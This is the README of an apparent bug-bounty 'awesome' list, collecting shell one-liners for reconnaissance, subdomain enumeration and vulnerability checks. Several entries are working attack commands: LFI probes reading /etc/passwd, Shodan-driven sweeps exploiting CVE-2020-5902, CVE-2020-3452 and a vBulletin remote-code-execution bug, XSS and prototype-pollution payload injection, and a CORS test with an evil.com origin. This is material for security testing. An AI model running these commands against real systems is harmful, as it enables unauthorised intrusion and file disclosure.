{
  "repo_name": "dwisiswant0_awesome-oneliner-bugbounty",
  "readme_content": "# Awesome One-liner Bug Bounty [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)\n> A collection of awesome one-liner scripts especially for bug bounty.\n\nThis repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily\u2665 welcome.\n\n## Definitions\n\nThis section defines specific terms or placeholders that are used throughout one-line command/scripts.\n\n- 1.1. \"**HOST**\" defines one hostname, (sub)domain, or IP address, e.g. replaced by `internal.host`, `domain.tld`, `sub.domain.tld`, or `127.0.0.1`.\n- 1.2. \"**HOSTS.txt**\" contains criteria 1.1 with more than one in file.\n- 2.1. \"**URL**\" definitely defines the URL, e.g. replaced by `http://domain.tld/path/page.html` or somewhat starting with HTTP/HTTPS protocol.\n- 2.2. \"**URLS.txt**\" contains criteria 2.1 with more than one in file.\n- 3.1. \"**FILE.txt**\" or \"**FILE**`{N}`**.txt**\" means the files needed to run the command/script according to its context and needs.\n- 4.1. \"**OUT.txt**\" or \"**OUT**`{N}`**.txt**\" means the file as the target storage result will be the command that is executed.\n\n---\n\n### Local File Inclusion\n> @dwisiswant0\n\n```bash\ngau HOST | gf lfi | qsreplace \"/etc/passwd\" | xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'\n```\n\n### Open-redirect\n> @dwisiswant0\n\n```bash\nexport LHOST=\"URL\"; gau $1 | gf redirect | qsreplace \"$LHOST\" | xargs -I % -P 25 sh -c 'curl -Is \"%\" 2>&1 | grep -q \"Location: $LHOST\" && echo \"VULN! %\"'\n```\n\n> @N3T_hunt3r\n```bash\ncat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null\n```\n\n### XSS\n> @cihanmehmet\n\n```bash\ngospider -S URLS.txt -c 10 -d 5 --blacklist \".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)\" --other-source | grep -e \"code-200\" | awk '{print $5}'| grep \"=\" | qsreplace -a | dalfox pipe | tee OUT.txt\n```\n\n> @fanimalikhack\n\n```bash\nwaybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt\n```\n\n> @oliverrickfors\n\n```bash\ncat HOSTS.txt | getJS | httpx --match-regex \"addEventListener\\((?:'|\\\")message(?:'|\\\")\"\n```\n\n### Prototype Pollution\n> @R0X4R\n\n```bash\nsubfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\/?__proto__[testparam]=exploit\\//' FILE.txt | page-fetch -j 'window.testparam == \"exploit\"? \"[VULNERABLE]\" : \"[NOT VULNERABLE]\"' | sed \"s/(//g\" | sed \"s/)//g\" | sed \"s/JS //g\" | grep \"VULNERABLE\"\n```\n\n### CVE-2020-5902\n> @Madrobot_\n\n```bash\nshodan search http.favicon.hash:-335242539 \"3992\" --fields ip_str,port --separator \" \" | awk '{print $1\":\"$2}' | while read host do ;do curl --silent --path-as-is --insecure \"https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" | grep -q root && \\printf \"$host \\033[0;31mVulnerable\\n\" || printf \"$host \\033[0;32mNot Vulnerable\\n\";done\n```\n\n### CVE-2020-3452\n> @vict0ni\n\n```bash\nwhile read LINE; do curl -s -k \"https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" | head | grep -q \"Cisco\" && echo -e \"[${GREEN}VULNERABLE${NC}] $LINE\" || echo -e \"[${RED}NOT VULNERABLE${NC}] $LINE\"; done < HOSTS.txt\n```\n\n### CVE-2022-0378\n> @7h3h4ckv157\n\n```bash\ncat URLS.txt | while read h do; do curl -sk \"$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x\"|grep -qs \"onmouse\" && echo \"$h: VULNERABLE\"; done\n```\n\n### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution\n> @Madrobot_\n\n```bash\nshodan search http.favicon.hash:-601665621 --fields ip_str,port --separator \" \" | awk '{print $1\":\"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \\printf \"$host \\033[0;31mVulnerable\\n\" || printf \"$host \\033[0;32mNot Vulnerable\\n\";done;\n```\n\n### Find JavaScript Files\n> @D0cK3rG33k\n\n```bash\nassetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo \"var [a-zA-Zo-9_]+\" | sed -e 's, 'var','\"$url\"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e \"\\e[1;33m$url\\n\" \"\\e[1;32m$vars\"; done\n```\n\n### Extract Endpoints from JavaScript\n> @renniepak\n\n```bash\ncat FILE.js | grep -oh \"\\\"\\/[a-zA-Z0-9_/?=&]*\\\"\" | sed -e 's/^\"//' -e 's/\"$//' | sort -u\n```\n\n### Get CIDR & Org Information from Target Lists\n> @steve_mcilwain\n\n```bash\nfor HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e \"CIDR\\|Organization\" | tr -s \" \" | paste - -; d\none | uniq); done\n```\n\n### Get Subdomains from RapidDNS.io\n> @andirrahmani1\n\n```bash\ncurl -s \"https://rapiddns.io/subdomain/$1?full=1#result\" | grep \"<td><a\" | cut -d '\"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u\n```\n\n### Get Subdomains from BufferOver.run\n> @\\_ayoubfathi\\_\n\n```bash\ncurl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u\n```\n\n> @AnubhavSingh_\n```bash\nexport domain=\"HOST\"; curl \"https://tls.bufferover.run/dns?q=$domain\" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep \"\\.$domain\"\n```\n\n### Get Subdomains from Riddler.io\n> @pikpikcu\n\n```bash\ncurl -s \"https://riddler.io/search/exportcsv?q=pld:HOST\" | grep -Po \"(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | sort -u \n```\n\n### Get Subdomains from VirusTotal\n> @pikpikcu\n\n```bash\ncurl -s \"https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40\" | grep -Po \"((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | sort -u\n```\n\n### Get Subdomain with cyberxplore\n> @pikpikcu\n\n```\ncurl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po \"(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" \n```\n\n### Get Subdomains from CertSpotter\n> @caryhooper\n\n```bash\ncurl -s \"https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names\" | jq .[].dns_names | grep -Po \"(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | sort -u \n```\n\n### Get Subdomains from Archive\n> @pikpikcu\n\n```bash\ncurl -s \"http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey\" | sed -e 's_https*://__' -e \"s/\\/.*//\" | sort -u\n```\n\n### Get Subdomains from JLDC\n> @pikpikcu\n\n```bash\ncurl -s \"https://jldc.me/anubis/subdomains/HOST\" | grep -Po \"((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | sort -u\n```\n\n### Get Subdomains from securitytrails\n> @pikpikcu\n\n```bash\ncurl -s \"https://securitytrails.com/list/apex_domain/HOST\" | grep -Po \"((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | grep \".HOST\" | sort -u\n```\n\n### Bruteforcing Subdomain using DNS Over \n> @pikpikcu\n\n```\nwhile read sub; do echo \"https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true\" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\\[]{1}([,:{}\\[\\]0-9.\\-+Eaeflnr-u \\n\\r\\t]|\".*?\")+[}\\]]{1}' | jq | grep \"name\" | grep -Po \"((http|https):\\/\\/)?(([\\w.-]*)\\.([\\w]*)\\.([A-z]))\\w+\" | grep \".HOST\" | sort -u ; done < FILE.txt\n```\n\n### Get Subdomains With sonar.omnisint.io\n> @pikpikcu\n\n```\ncurl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE \"[a-zA-Z0-9._-]+\\.HOST\" | sort -u \n```\n\n### Get Subdomains With synapsint.com\n> @pikpikcu\n\n```\ncurl --silent -X POST https://synapsint.com/report.php -d \"name=https%3A%2F%2FHOST\" | grep -oE \"[a-zA-Z0-9._-]+\\.HOST\" | sort -u \n```\n\n### Get Subdomains from crt.sh\n> @vict0ni\n\n```bash\ncurl -s \"https://crt.sh/?q=%25.HOST&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n```\n\n### Sort & Tested Domains from Recon.dev\n> @stokfedrik\n\n```bash\ncurl \"https://recon.dev/api/search?key=apikey&domain=HOST\" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent\n```\n\n### Subdomain Bruteforcer with FFUF\n> @GochaOqradze\n\n```bash\nffuf -u https://FUZZ.HOST -w FILE.txt -v | grep \"| URL |\" | awk '{print $4}'\n```\n\n### Find Allocated IP Ranges for ASN from IP Address\n> wains.be\n\n```bash\nwhois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w \"route:\" | awk '{print $NF}' | sort -n\n```\n\n### Extract IPs from a File\n> @emenalf\n\n```bash\ngrep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt\n```\n\n### Ports Scan without CloudFlare\n> @dwisiswant0\n\n```bash\nsubfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe\n```\n\n### Create Custom Wordlists\n> @tomnomnom\n\n```bash\ngau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\\.css\\|\\.png\\|\\.jpeg\\|\\.jpg\\|\\.svg\\|\\.gif\\|\\.wolf\\|\\.bmp//g' FILE1.txt\n```\n\n```bash\ncat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  \n```\n\n### Extracts Juicy Informations\n> @Prial Islam Khan\n\n```bash\nfor sub in $(cat HOSTS.txt); do gron \"https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1\" | grep \"\\burl\\b\" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/\"//g'| sort -u | tee -a OUT.txt  ;done\n```\n\n### Find Subdomains TakeOver\n> @hahwul\n\n```bash\nsubfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; \n```\n\n### Dump Custom URLs from ParamSpider\n> @hahwul\n\n```bash\ncat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;\n```\n\n### URLs Probing with cURL + Parallel\n> @akita_zen\n\n```bash\ncat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\\t  Size:%{size_download}\\t %{url_effective}\\n' -o /dev/null -sk\n```\n\n### Dump In-scope Assets from `chaos-bugbounty-list`\n> @dwisiswant0\n\n```bash\ncurl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'\n```\n\n### Dump In-scope Assets from `bounty-targets-data`\n> @dwisiswant0\n\n#### HackerOne Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'\n```\n\n#### BugCrowd Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\n```\n\n#### Intigriti Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'\n```\n\n#### YesWeHack Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\n```\n\n#### HackenProof Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'\n```\n\n#### Federacy Programs\n\n```bash\ncurl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'\n```\n\n### Dump URLs from sitemap.xml\n> @healthyoutlet\n\n```bash\ncurl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'\n```\n\n### Pure Bash Linkfinder\n> @ntrzz\n\n```bash\ncurl -s $1 | grep -Eo \"(http|https)://[a-zA-Z0-9./?=_-]*\" | sort | uniq | grep \".js\" > FILE.txt; while IFS= read link; do python linkfinder.py -i \"$link\" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt\n```\n\n### Extract Endpoints from swagger.json\n> @zer0pwn\n\n```bash\ncurl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'\n```\n\n### CORS Misconfiguration\n> @manas_hunter\n\n```bash\nsite=\"URL\"; gau \"$site\" | while read url; do target=$(curl -sIH \"Origin: https://evil.com\" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on \"$url\"; fi; done\n```\n\n### Find Hidden Servers and/or Admin Panels\n> @rez0__\n\n```bash\nffuf -c -u URL -H \"Host: FUZZ\" -w FILE.txt \n```\n\n### Recon Using api.recon.dev\n> @z0idsec\n\n```bash\ncurl -s -w \"\\n%{http_code}\" https://api.recon.dev/search?domain=HOST | jg .[].domain\n```\n\n### Find Live Host/Domain/Assets\n> @_YashGoti_\n\n```bash\nsubfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u\n```\n\n### XSS without gf\n> @HacktifyS\n\n```bash\nwaybackurls HOST | grep '=' | qsreplace '\"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is \"$host\" | grep -qs \"<script>alert(1)</script>\" && echo \"$host is vulnerable\"; done\n```\n\n### Get Subdomains from IPs\n> @laughface809\n\n```bash\npython3 hosthunter.py HOSTS.txt > OUT.txt\n```\n\n### Gather Domains from Content-Security-Policy\n> @geeknik\n\n```bash\ncurl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo \"[a-zA-Z0-9./?=_-]*\" |  sed -e '/\\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\\.//' | sort -u\n```\n\n### Nmap IP:PORT Parser Piped to HTTPX\n> @dwisiswant0\n\n```bash\nnmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address[\"@addr\"] + \":\" + .ports.port[][\"@portid\"])' | httpx --silent\n```\n"
}